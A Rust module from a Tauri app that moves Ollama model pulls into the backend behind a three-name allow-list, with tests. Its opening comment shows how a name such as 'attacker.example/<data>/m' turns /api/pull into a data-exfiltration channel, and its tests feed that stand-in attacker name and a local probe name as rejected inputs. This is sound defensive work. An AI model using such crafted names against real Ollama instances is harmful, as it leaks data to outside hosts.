//! Model pulls (R-66), done here rather than through the page's HTTP scope.
//!
//! Ollama's `/api/pull` dials whatever registry host a model name names
//! (`attacker.example/<data>/m` makes it fetch `https://attacker.example/v2/<data>/m/...`), and
//! `"insecure": true` drops TLS. With `/api/pull` in the page's scope, any script in the webview
//! could have used Ollama to send data to any host. So the scope no longer contains it: the page
//! asks for one of the models it recommends by name, this module checks the name against the
//! same list, and the request body is built here, with no `insecure` field.

use serde_json::{json, Value};
use std::time::Duration;
use tauri::ipc::Channel;

/// `LOCAL_RECOMMEND` in idea-walkthrough/index.html. A node test keeps the two lists equal.
pub const ALLOWED: &[&str] = &["qwen3:8b", "qwen3:14b", "llama3.3:70b"];

pub const DEFAULT_BASE: &str = "http://127.0.0.1:11434";

pub fn allowed(model: &str) -> bool {
    ALLOWED.contains(&model)
}

/// The whole request body. Nothing the page sends reaches it except an allow-listed name.
pub fn body(model: &str) -> String {
    json!({ "model": model, "stream": true }).to_string()
}

/// One NDJSON line from Ollama, reduced to what the page shows. `Err` carries Ollama's error.
pub fn progress(line: &str) -> Option<Result<Value, String>> {
    let v: Value = serde_json::from_str(line.trim()).ok()?;
    if let Some(e) = v.get("error") {
        return Some(Err(e.as_str().map(str::to_string).unwrap_or_else(|| e.to_string())));
    }
    let mut out = serde_json::Map::new();
    if let Some(s) = v.get("status").and_then(Value::as_str) {
        out.insert("status".into(), Value::String(s.chars().take(120).collect()));
    }
    for k in ["total", "completed"] {
        if let Some(n) = v.get(k).and_then(Value::as_u64) {
            out.insert(k.into(), Value::from(n));
        }
    }
    Some(Ok(Value::Object(out)))
}

/// Runs the pull, sending progress objects and then exactly one `{ "end": ... }`.
pub async fn run(base: String, model: String, ch: Channel<Value>) {
    let end = match stream(&base, &model, &ch).await {
        Ok(()) => json!({ "end": "success" }),
        Err(e) => json!({ "end": "error", "error": e }),
    };
    let _ = ch.send(end);
}

async fn stream(base: &str, model: &str, ch: &Channel<Value>) -> Result<(), String> {
    use tauri_plugin_http::reqwest;
    let client = reqwest::Client::builder()
        .connect_timeout(Duration::from_secs(5))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .map_err(|e| e.to_string())?;
    let mut r = client
        .post(format!("{base}/api/pull"))
        .header("Content-Type", "application/json")
        .body(body(model))
        .send()
        .await
        .map_err(|e| format!("Ollama did not answer: {e}"))?;
    if !r.status().is_success() {
        return Err(format!("Ollama answered HTTP {}", r.status().as_u16()));
    }
    let (mut buf, mut ok) = (Vec::<u8>::new(), false);
    let line = |raw: &[u8], ok: &mut bool| -> Result<(), String> {
        match progress(&String::from_utf8_lossy(raw)) {
            None => Ok(()),
            Some(Err(e)) => Err(e),
            Some(Ok(v)) => {
                if v.get("status").and_then(Value::as_str) == Some("success") {
                    *ok = true;
                }
                let _ = ch.send(v);
                Ok(())
            }
        }
    };
    while let Some(chunk) = r.chunk().await.map_err(|e| format!("the download stopped: {e}"))? {
        buf.extend_from_slice(&chunk);
        while let Some(i) = buf.iter().position(|&b| b == b'\n') {
            let l: Vec<u8> = buf.drain(..=i).collect();
            line(&l, &mut ok)?;
        }
    }
    line(&buf, &mut ok)?;
    if ok {
        Ok(())
    } else {
        Err("the download ended before Ollama reported success".into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn only_recommended_names_pass() {
        for m in ALLOWED {
            assert!(allowed(m));
        }
        for bad in ["127.0.0.1:1/probe/m", "attacker.example/x/m", "qwen3:8b ", "QWEN3:8B", "", "qwen3:8b\n", "registry.ollama.ai/library/qwen3:8b"] {
            assert!(!allowed(bad), "{bad:?}");
        }
    }

    #[test]
    fn the_body_never_asks_for_insecure() {
        let b: Value = serde_json::from_str(&body("qwen3:8b")).unwrap();
        assert_eq!(b, json!({ "model": "qwen3:8b", "stream": true }));
        assert!(!body("qwen3:8b").contains("insecure"));
    }

    #[test]
    fn progress_keeps_only_what_the_page_shows() {
        let v = progress(r#"{"status":"pulling abc","digest":"sha256:x","total":10,"completed":4}"#).unwrap().unwrap();
        assert_eq!(v, json!({ "status": "pulling abc", "total": 10, "completed": 4 }));
        assert_eq!(progress(r#"{"error":"pull model manifest: file does not exist"}"#).unwrap().unwrap_err(),
                   "pull model manifest: file does not exist");
        assert!(progress("not json").is_none());
        assert!(progress("").is_none());
    }
}
